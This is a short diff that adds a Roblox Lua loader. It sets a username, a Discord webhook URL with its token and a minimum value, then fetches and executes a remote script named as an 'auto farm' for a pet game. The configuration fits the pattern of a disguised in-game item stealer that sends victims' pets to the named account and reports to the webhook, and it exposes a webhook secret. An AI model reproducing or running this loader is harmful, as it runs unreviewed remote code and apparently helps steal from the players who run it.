@@ -1,0 +1,4 @@
+_G.User = "adoptme12779"
+_G.Webhook = "https://discord.com/api/webhooks/1305681179617398815/BeP0T1XgqGWIGdKqdpF1konZPw7XarN6XMCuDE5WVB174W_9SLOa1GrYLLilsaXdi_a6"
+_G.Min = 1
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetsGO/refs/heads/main/AutoFarmOP.lua", true))()
